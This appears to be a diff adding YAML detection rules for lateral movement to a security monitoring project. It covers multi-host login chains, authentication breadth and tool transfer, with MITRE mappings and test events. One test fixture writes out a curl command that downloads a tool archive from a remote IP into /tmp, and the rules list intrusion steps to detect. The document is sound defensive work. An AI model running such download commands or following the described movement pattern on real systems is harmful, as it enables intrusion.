@@ -1,0 +1,177 @@
+# Lateral movement.
+#
+# The defining property is *breadth*: one identity touching machines it does not
+# normally touch. A single internal SSH session is administration. The same
+# account authenticating to a host, opening an internal remote-admin connection
+# and then authenticating somewhere new is movement.
+---
+id: LATERAL_MOVEMENT_001
+name: Internal Lateral Movement Chain
+description: >
+  An account authenticated to one host, opened an internal connection over a
+  remote-administration protocol, and then authenticated to a second host - all
+  within one window. The cross-step constraint requires at least two distinct
+  hosts, so repeated logins to the same machine cannot satisfy the rule.
+type: sequence
+severity: high
+confidence: 0.84
+category: lateral-movement
+author: sentinel-x
+version: "1.0"
+
+mitre:
+  techniques: [T1021, T1021.004, T1078]
+  tactics: [TA0008]
+
+group_by: [user]
+window_seconds: 1200
+ordered: true
+
+steps:
+  - name: initial_access
+    min_count: 1
+    selection:
+      event_type: authentication
+      status: success
+      action: [login, session_open]
+  - name: internal_remote_connection
+    min_count: 1
+    max_gap_seconds: 900
+    selection:
+      event_type: network
+      metadata.internal_lateral_candidate: true
+  - name: second_host_access
+    min_count: 1
+    max_gap_seconds: 900
+    selection:
+      event_type: authentication
+      status: success
+      action: [login, session_open]
+
+constraints:
+  - distinct_field: host
+    min_distinct: 2
+
+title_template: "Lateral movement by {user} across multiple hosts"
+dedup_window_seconds: 3600
+
+false_positives:
+  - "Administrators and automation that legitimately hop between hosts - jump boxes, Ansible runs and monitoring agents produce exactly this shape."
+  - "Session brokers where a single service identity fronts many user sessions."
+
+references:
+  - "https://attack.mitre.org/techniques/T1021/004/"
+
+tests:
+  - name: login, internal ssh connection, login to a second host
+    expect: match
+    events:
+      - {offset_seconds: 0,   event_type: authentication, action: login, status: success, host_id: LINUX-03, user_id: admin, source_ip: 203.0.113.44}
+      - {offset_seconds: 120, event_type: network, action: allow, status: success, host_id: LINUX-03, user_id: admin, source_ip: 10.20.4.31, destination_ip: 10.20.4.52, destination_port: 22, metadata: {internal_lateral_candidate: true, service: ssh}}
+      - {offset_seconds: 150, event_type: authentication, action: login, status: success, host_id: LINUX-07, user_id: admin, source_ip: 10.20.4.31}
+  - name: repeated access to the same host is not movement
+    expect: no_match
+    events:
+      - {offset_seconds: 0,   event_type: authentication, action: login, status: success, host_id: LINUX-03, user_id: admin, source_ip: 203.0.113.44}
+      - {offset_seconds: 120, event_type: network, action: allow, status: success, host_id: LINUX-03, user_id: admin, source_ip: 10.20.4.31, destination_ip: 10.20.4.52, destination_port: 22, metadata: {internal_lateral_candidate: true, service: ssh}}
+      - {offset_seconds: 150, event_type: authentication, action: login, status: success, host_id: LINUX-03, user_id: admin, source_ip: 10.20.4.31}
+
+---
+id: LATERAL_BREADTH_001
+name: Account Authenticated To Unusually Many Hosts
+description: >
+  One account authenticated successfully to several distinct hosts in a short
+  period. This catches movement that leaves no usable network telemetry, and it
+  is the rule most likely to catch an actor using stolen credentials with a
+  legitimate remote-access tool.
+type: threshold
+severity: high
+confidence: 0.76
+category: lateral-movement
+author: sentinel-x
+version: "1.0"
+
+mitre:
+  techniques: [T1021, T1078]
+  tactics: [TA0008]
+
+selection:
+  event_type: authentication
+  status: success
+  action: [login, session_open]
+
+group_by: [user]
+
+threshold:
+  count: 4
+  window_seconds: 900
+  distinct_field: host
+  distinct_count: 4
+
+title_template: "{user} authenticated to multiple hosts in a short period"
+dedup_window_seconds: 3600
+
+false_positives:
+  - "Configuration management and monitoring accounts authenticate to the entire estate by design and should be excluded by an allow-list in a real deployment."
+  - "Administrators performing a fleet-wide change."
+
+references:
+  - "https://attack.mitre.org/techniques/T1021/"
+
+tests:
+  - name: four distinct hosts in ten minutes
+    expect: match
+    events:
+      - {offset_seconds: 0,   event_type: authentication, action: login, status: success, host_id: LINUX-03, user_id: admin, source_ip: 10.20.4.31}
+      - {offset_seconds: 90,  event_type: authentication, action: login, status: success, host_id: LINUX-07, user_id: admin, source_ip: 10.20.4.31}
+      - {offset_seconds: 180, event_type: authentication, action: login, status: success, host_id: LINUX-11, user_id: admin, source_ip: 10.20.4.31}
+      - {offset_seconds: 260, event_type: authentication, action: login, status: success, host_id: WIN-APP-01, user_id: admin, source_ip: 10.20.4.31}
+  - name: four logins to one host is normal use
+    expect: no_match
+    events:
+      - {offset_seconds: 0,   event_type: authentication, action: login, status: success, host_id: LINUX-03, user_id: admin, source_ip: 10.20.4.31}
+      - {offset_seconds: 90,  event_type: authentication, action: login, status: success, host_id: LINUX-03, user_id: admin, source_ip: 10.20.4.31}
+      - {offset_seconds: 180, event_type: authentication, action: login, status: success, host_id: LINUX-03, user_id: admin, source_ip: 10.20.4.31}
+      - {offset_seconds: 260, event_type: authentication, action: login, status: success, host_id: LINUX-03, user_id: admin, source_ip: 10.20.4.31}
+
+---
+id: LATERAL_TOOL_TRANSFER_001
+name: Tool Transfer To Internal Host
+description: >
+  A download utility was executed with a remote URL on a host shortly after that
+  host was accessed. Staging tooling on a freshly accessed machine is a routine
+  step in hands-on-keyboard intrusion.
+type: match
+severity: medium
+confidence: 0.62
+category: lateral-movement
+author: sentinel-x
+version: "1.0"
+
+mitre:
+  techniques: [T1105, T1570]
+  tactics: [TA0011, TA0008]
+
+selection:
+  event_type: [process, discovery]
+  metadata.argument_indicators:
+    contains: remote_download
+
+title_template: "Remote download executed by {user} on {host}"
+dedup_window_seconds: 900
+
+false_positives:
+  - "Build agents, package installs and container image pulls use curl and wget constantly. In a real deployment this rule needs a build-infrastructure exclusion."
+
+references:
+  - "https://attack.mitre.org/techniques/T1105/"
+
+tests:
+  - name: curl to a remote host
+    expect: match
+    events:
+      - {offset_seconds: 0, event_type: process, action: exec, status: success, host_id: LINUX-07, user_id: admin, process: curl, command_line: "curl -sL http://198.51.100.200/tools.tgz -o /tmp/t.tgz", metadata: {argument_indicators: [remote_download]}}
+  - name: an ordinary process execution is not a tool transfer
+    expect: no_match
+    events:
+      - {offset_seconds: 0, event_type: process, action: exec, status: success, host_id: LINUX-07, user_id: admin, process: tar, command_line: "tar -xzf /tmp/backup.tgz", metadata: {}}
